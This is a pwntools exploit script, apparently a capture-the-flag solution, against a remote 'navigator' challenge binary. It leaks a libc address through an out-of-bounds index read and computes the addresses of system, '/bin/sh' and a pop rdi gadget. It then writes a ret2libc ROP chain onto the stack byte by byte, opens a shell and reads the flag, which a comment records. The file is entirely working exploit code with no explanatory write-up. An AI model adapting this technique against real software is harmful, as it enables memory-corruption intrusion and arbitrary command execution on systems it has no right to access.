from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./navigator')
p = remote("chal.competitivecyber.club", 8887)
#p = gdb.debug('./navigator', 'br *main + 249')

offsetToAtoi = -136
libcAtoi = 0
# Leak libc atoi
for i in range(8):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'>> ')
    p.sendline(str(offsetToAtoi+i).encode())
    p.recvuntil(b'Pin:\n')
    b = p.recv(1)
    libcAtoi += int.from_bytes(b, "little")<<(i*8)
    print(hex(libcAtoi))


#calculate system
libcBase = libcAtoi - 0x1E650 - 0x14
libcSystem = libcAtoi - 0x14 + 0xd730

#binsh from libc address
sh = p64(libcAtoi+ 0x195038 - 0x14)

#my poprdi gadget from libc
poprdi = p64(libcAtoi - 0x14 - 0x18efb)

#offset to return address
retaddr = 0x158

#to make it iterable
poprdi = list(poprdi)

print("this will take a while")

#now sequentially write the addresses onto the stack
#this is very annoying could have definitely been made into a function but
#was lazy and just copy pasted

for i in range(8):
    p.sendlineafter(b"Set a pin", b'1')
    p.sendlineafter(b"index", str(retaddr + i).encode() )
    p.sendlineafter(b"character", p8(poprdi[i]))

sh = list(sh)
retaddr +=8
for i in range(8):
    p.sendlineafter(b"Set a pin", b'1')
    p.sendlineafter(b"index", str(retaddr + i).encode() )
    p.sendlineafter(b"character", p8(sh[i]))

m = list(p64(0x7ffd55a6f9e0))
retaddr +=8

for i in range(8):
    p.sendlineafter(b"Set a pin", b'1')
    p.sendlineafter(b"index", str(retaddr + i).encode() )
    p.sendlineafter(b"character", p8(m[i]))

retaddr += 8
libcSystem = list(p64(libcSystem))

for i in range(8):
    p.sendlineafter(b"Set a pin", b'1')
    p.sendlineafter(b"index", str(retaddr + i).encode() )
    p.sendlineafter(b"character", p8(libcSystem[i]))


#quit out into a shell and cat flag

p.sendline(b'3')
p.sendline(b'cat flag.txt')

#this is very jank for some reason so type in ls or something for the stuf to actually show up 
# pctf{th4t_w45_ann0ying_014d0a7cb3d} 
p.interactive()
